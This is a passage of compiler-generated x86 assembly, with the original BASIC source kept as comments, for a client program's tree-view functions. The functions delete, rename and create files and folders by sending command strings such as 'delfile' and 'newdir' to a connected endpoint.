	call	%____free			;;; i423
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  TreeDelDir ()  *****
;  *****
;
; [1246] FUNCTION TreeDelAllFiles (hItem)
.code
;
#ifdef TreeDelAllFiles.hItem
#undef TreeDelAllFiles.hItem
#endif
#define TreeDelAllFiles.hItem ebp+8	; exposes function argument 'hItem'
;
align 16
_TreeDelAllFiles.client@4:
;  *****
;  *****  FUNCTION  TreeDelAllFiles ()  *****
;  *****
func5B.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func5B.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody5B.client:
;
; [1247] STRING label,dir
#ifdef TreeDelAllFiles.label
#undef TreeDelAllFiles.label
#endif
#define TreeDelAllFiles.label ebp-40	; exposes local variable 'label'
;
#ifdef TreeDelAllFiles.dir
#undef TreeDelAllFiles.dir
#endif
#define TreeDelAllFiles.dir ebp-44	; exposes local variable 'dir'
;
;
; [1250] IFZ hItem THEN RETURN 0
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0085.client			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func5B.client			;;; i258
else.0085.client:
end.if.0085.client:
;
; [1251] label = getTreeItemLabel (#tree_tab, hItem)
	push	[ebp+8]			;;; i674a
	push	[%#tree_tab.client]			;;; i672a
	call	func51.client			;;; i619
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1252] IF (RIGHT$(label,1) != "\\") THEN RETURN 0
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0149.client			;;; i663
	call	%_string.compare.sv			;;; i690
	je	>> else.0086.client			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func5B.client			;;; i258
else.0086.client:
end.if.0086.client:
;
; [1253] dir = getTreeCompLabel(hItem)
	push	[ebp+8]			;;; i674a
	call	func52.client			;;; i619
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1254] IFZ dir THEN RETURN 0
	mov	eax,[ebp-44]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.255			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0087.client			;;; i192
A.255:
	mov	eax,0			;;; i659
	jmp	end.func5B.client			;;; i258
else.0087.client:
end.if.0087.client:
;
; [1256] hParent = getTreeParent(hItem)
#ifdef TreeDelAllFiles.hParent
#undef TreeDelAllFiles.hParent
#endif
#define TreeDelAllFiles.hParent ebp-48	; exposes local variable 'hParent'
;
	push	[ebp+8]			;;; i674a
	call	func53.client			;;; i619
	mov	d[ebp-48],eax			;;; i670
;
; [1257] SendMessageA (#tree_tab, $$TVM_DELETEITEM, 0, hItem)
	push	[ebp+8]			;;; i674a
	push	0			;;; i656a
	push	4353			;;; i656a
	push	[%#tree_tab.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [1258] SendSMessage(idx,"delallfiles "+STRING$(hParent)+" "+dir+"*.*|"+label+"|")
#ifdef TreeDelAllFiles.idx
#undef TreeDelAllFiles.idx
#endif
#define TreeDelAllFiles.idx ebp-52	; exposes local variable 'idx'
;
	sub	esp,64			;;; i487
	mov	eax,d[ebp-48]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.02E3.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0145.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-44]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.02E4.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.02DC.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp-52]			;;; i674a
	call	func33.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1259] RETURN 1
	mov	eax,1			;;; i659
	jmp	end.func5B.client			;;; i258
;
; [1260] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.TreeDelAllFiles.client:  ;;; Function end label for Assembly Programmers.
end.func5B.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func5B.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func5B.client:
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  TreeDelAllFiles ()  *****
;  *****
;
; [1262] FUNCTION TreeDelFile (hItem)
.code
;
#ifdef TreeDelFile.hItem
#undef TreeDelFile.hItem
#endif
#define TreeDelFile.hItem ebp+8	; exposes function argument 'hItem'
;
align 16
_TreeDelFile.client@4:
;  *****
;  *****  FUNCTION  TreeDelFile ()  *****
;  *****
func5A.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func5A.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody5A.client:
;
; [1263] STRING filename,dir
#ifdef TreeDelFile.filename
#undef TreeDelFile.filename
#endif
#define TreeDelFile.filename ebp-40	; exposes local variable 'filename'
;
#ifdef TreeDelFile.dir
#undef TreeDelFile.dir
#endif
#define TreeDelFile.dir ebp-44	; exposes local variable 'dir'
;
;
; [1266] IFZ hItem THEN RETURN 0
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0088.client			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func5A.client			;;; i258
else.0088.client:
end.if.0088.client:
;
; [1267] filename = getTreeItemLabel (#tree_tab, hItem)
	push	[ebp+8]			;;; i674a
	push	[%#tree_tab.client]			;;; i672a
	call	func51.client			;;; i619
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1268] IF RIGHT$(filename,1) == "\\" THEN
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0149.client			;;; i663
	call	%_string.compare.sv			;;; i690
	jne	>> else.0089.client			;;; i219
;
; [1269] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func5A.client			;;; i258
;
; [1270] ELSE
	jmp	end.if.0089.client			;;; i107
else.0089.client:
;
; [1271] hParent = getTreeParent(hItem)
#ifdef TreeDelFile.hParent
#undef TreeDelFile.hParent
#endif
#define TreeDelFile.hParent ebp-48	; exposes local variable 'hParent'
;
	push	[ebp+8]			;;; i674a
	call	func53.client			;;; i619
	mov	d[ebp-48],eax			;;; i670
;
; [1272] IFZ hParent THEN RETURN 0
	mov	eax,d[ebp-48]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.008A.client			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func5A.client			;;; i258
else.008A.client:
end.if.008A.client:
;
; [1273] END IF
end.if.0089.client:
;
; [1275] dir = getTreeCompLabel(hParent)
	push	[ebp-48]			;;; i674a
	call	func52.client			;;; i619
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1276] IFZ dir THEN RETURN 0
	mov	eax,[ebp-44]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.259			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.008B.client			;;; i192
A.259:
	mov	eax,0			;;; i659
	jmp	end.func5A.client			;;; i258
else.008B.client:
end.if.008B.client:
;
; [1278] SendMessageA (#tree_tab, $$TVM_DELETEITEM, 0, hItem)
	push	[ebp+8]			;;; i674a
	push	0			;;; i656a
	push	4353			;;; i656a
	push	[%#tree_tab.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [1279] SendSMessage(idx,"delfile "+STRING$(hParent)+" "+dir+"|"+filename+"|")
#ifdef TreeDelFile.idx
#undef TreeDelFile.idx
#endif
#define TreeDelFile.idx ebp-52	; exposes local variable 'idx'
;
	sub	esp,64			;;; i487
	mov	eax,d[ebp-48]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.02EB.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0145.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-44]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.02DC.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.02DC.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp-52]			;;; i674a
	call	func33.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1281] RETURN 1
	mov	eax,1			;;; i659
	jmp	end.func5A.client			;;; i258
;
; [1282] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.TreeDelFile.client:  ;;; Function end label for Assembly Programmers.
end.func5A.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func5A.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func5A.client:
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  TreeDelFile ()  *****
;  *****
;
; [1284] FUNCTION renameTreeFile (hItem, STRING newname)
.code
;
#ifdef renameTreeFile.hItem
#undef renameTreeFile.hItem
#endif
#define renameTreeFile.hItem ebp+8	; exposes function argument 'hItem'
;
;
#ifdef renameTreeFile.newname
#undef renameTreeFile.newname
#endif
#define renameTreeFile.newname ebp+12	; exposes function argument 'newname'
;
align 16
_renameTreeFile.client@8:
;  *****
;  *****  FUNCTION  renameTreeFile ()  *****
;  *****
func59.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func59.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody59.client:
;
; [1285] STRING dir,oldname
#ifdef renameTreeFile.dir
#undef renameTreeFile.dir
#endif
#define renameTreeFile.dir ebp-40	; exposes local variable 'dir'
;
#ifdef renameTreeFile.oldname
#undef renameTreeFile.oldname
#endif
#define renameTreeFile.oldname ebp-44	; exposes local variable 'oldname'
;
;
; [1288] IFZ hItem THEN RETURN 0
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.008C.client			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func59.client			;;; i258
else.008C.client:
end.if.008C.client:
;
; [1289] IFZ newname THEN RETURN 0
	mov	eax,[ebp+12]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.263			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.008D.client			;;; i192
A.263:
	mov	eax,0			;;; i659
	jmp	end.func59.client			;;; i258
else.008D.client:
end.if.008D.client:
;
; [1290] oldname = getTreeItemLabel (#tree_tab, hItem)
	push	[ebp+8]			;;; i674a
	push	[%#tree_tab.client]			;;; i672a
	call	func51.client			;;; i619
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1291] IF RIGHT$(oldname,1) == "\\" THEN
	sub	esp,64			;;; i487
	mov	eax,[ebp-44]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0149.client			;;; i663
	call	%_string.compare.sv			;;; i690
	jne	>> else.008E.client			;;; i219
;
; [1292] IF RIGHT$(newname,1) != "\\" THEN newname = newname+"\\"
	sub	esp,64			;;; i487
	mov	eax,[ebp+12]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0149.client			;;; i663
	call	%_string.compare.sv			;;; i690
	je	>> else.008F.client			;;; i219
	mov	eax,[ebp+12]			;;; i665
	mov	ebx,addr @_string.0149.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
else.008F.client:
end.if.008F.client:
;
; [1293] END IF
else.008E.client:
end.if.008E.client:
;
; [1294] hParent = getTreeParent(hItem)
#ifdef renameTreeFile.hParent
#undef renameTreeFile.hParent
#endif
#define renameTreeFile.hParent ebp-48	; exposes local variable 'hParent'
;
	push	[ebp+8]			;;; i674a
	call	func53.client			;;; i619
	mov	d[ebp-48],eax			;;; i670
;
; [1295] IFZ hParent THEN RETURN 0
	mov	eax,d[ebp-48]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0090.client			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func59.client			;;; i258
else.0090.client:
end.if.0090.client:
;
; [1296] dir = getTreeCompLabel(hParent)
	push	[ebp-48]			;;; i674a
	call	func52.client			;;; i619
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1297] IFZ dir THEN RETURN 0
	mov	eax,[ebp-40]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.264			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0091.client			;;; i192
A.264:
	mov	eax,0			;;; i659
	jmp	end.func59.client			;;; i258
else.0091.client:
end.if.0091.client:
;
; [1299] SendMessageA (#tree_tab, $$TVM_DELETEITEM, 0, hItem)
	push	[ebp+8]			;;; i674a
	push	0			;;; i656a
	push	4353			;;; i656a
	push	[%#tree_tab.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [1300] SendSMessage(idx,"movefile "+STRING$(hParent)+" "+dir+"|"+oldname+"|"+newname+"|")
#ifdef renameTreeFile.idx
#undef renameTreeFile.idx
#endif
#define renameTreeFile.idx ebp-52	; exposes local variable 'idx'
;
	sub	esp,64			;;; i487
	mov	eax,d[ebp-48]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.02F3.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0145.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.02DC.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-44]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.02DC.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp+12]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.02DC.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp-52]			;;; i674a
	call	func33.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1302] RETURN 1
	mov	eax,1			;;; i659
	jmp	end.func59.client			;;; i258
;
; [1303] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.renameTreeFile.client:  ;;; Function end label for Assembly Programmers.
end.func59.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func59.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func59.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  renameTreeFile ()  *****
;  *****
;
; [1305] FUNCTION createTreeNewDir (hItem, STRING name)
.code
;
#ifdef createTreeNewDir.hItem
#undef createTreeNewDir.hItem
#endif
#define createTreeNewDir.hItem ebp+8	; exposes function argument 'hItem'
;
;
#ifdef createTreeNewDir.name
#undef createTreeNewDir.name
#endif
#define createTreeNewDir.name ebp+12	; exposes function argument 'name'
;
align 16
_createTreeNewDir.client@8:
;  *****
;  *****  FUNCTION  createTreeNewDir ()  *****
;  *****
func58.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func58.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody58.client:
;
; [1306] STRING dir,label
#ifdef createTreeNewDir.dir
#undef createTreeNewDir.dir
#endif
#define createTreeNewDir.dir ebp-40	; exposes local variable 'dir'
;
#ifdef createTreeNewDir.label
#undef createTreeNewDir.label
#endif
#define createTreeNewDir.label ebp-44	; exposes local variable 'label'
;
;
; [1309] IFZ hItem THEN RETURN 0
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0092.client			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func58.client			;;; i258
else.0092.client:
end.if.0092.client:
;
; [1311] label = getTreeItemLabel (#tree_tab, hItem)
	push	[ebp+8]			;;; i674a
	push	[%#tree_tab.client]			;;; i672a
	call	func51.client			;;; i619
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1312] IF RIGHT$(label,1) != "\\" THEN
	sub	esp,64			;;; i487
	mov	eax,[ebp-44]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0149.client			;;; i663
	call	%_string.compare.sv			;;; i690
	je	>> else.0093.client			;;; i219
;
; [1313] hParent = getTreeParent(hItem)
#ifdef createTreeNewDir.hParent
#undef createTreeNewDir.hParent
#endif
#define createTreeNewDir.hParent ebp-48	; exposes local variable 'hParent'
;
	push	[ebp+8]			;;; i674a
	call	func53.client			;;; i619
	mov	d[ebp-48],eax			;;; i670
;
; [1314] ELSE
	jmp	end.if.0093.client			;;; i107
else.0093.client:
;
; [1315] hParent = hItem
	mov	eax,d[ebp+8]			;;; i665
	mov	d[ebp-48],eax			;;; i670
;
; [1316] END IF
end.if.0093.client:
;
; [1317] IFZ hParent THEN RETURN 0
	mov	eax,d[ebp-48]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0094.client			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func58.client			;;; i258
else.0094.client:
end.if.0094.client:
;
; [1319] dir = getTreeCompLabel(hParent)
	push	[ebp-48]			;;; i674a
	call	func52.client			;;; i619
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1320] IFZ dir THEN RETURN 0
	mov	eax,[ebp-40]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.268			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0095.client			;;; i192
A.268:
	mov	eax,0			;;; i659
	jmp	end.func58.client			;;; i258
else.0095.client:
end.if.0095.client:
;
; [1321] SendSMessage(idx,"newdir "+STRING$(hParent)+" "+dir+"|"+name+"|")
#ifdef createTreeNewDir.idx
#undef createTreeNewDir.idx
#endif
#define createTreeNewDir.idx ebp-52	; exposes local variable 'idx'
;
	sub	esp,64			;;; i487
	mov	eax,d[ebp-48]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.02FB.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0145.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.02DC.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp+12]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.02DC.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp-52]			;;; i674a
	call	func33.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1323] RETURN 1
	mov	eax,1			;;; i659
	jmp	end.func58.client			;;; i258
;
; [1324] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.createTreeNewDir.client:  ;;; Function end label for Assembly Programmers.
end.func58.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func58.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func58.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  createTreeNewDir ()  *****
;  *****
;
; [1326] FUNCTION ClearEditText (edit)
.code
;
#ifdef ClearEditText.edit
#undef ClearEditText.edit
#endif
#define ClearEditText.edit ebp+8	; exposes function argument 'edit'
;
align 16
_ClearEditText.client@4:
;  *****
;  *****  FUNCTION  ClearEditText ()  *****
;  *****
func1C.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func1C.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody1C.client:
;
; [1327] STRING text
#ifdef ClearEditText.text
#undef ClearEditText.text
#endif
#define ClearEditText.text ebp-40	; exposes local variable 'text'
;
;
; [1329] text = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
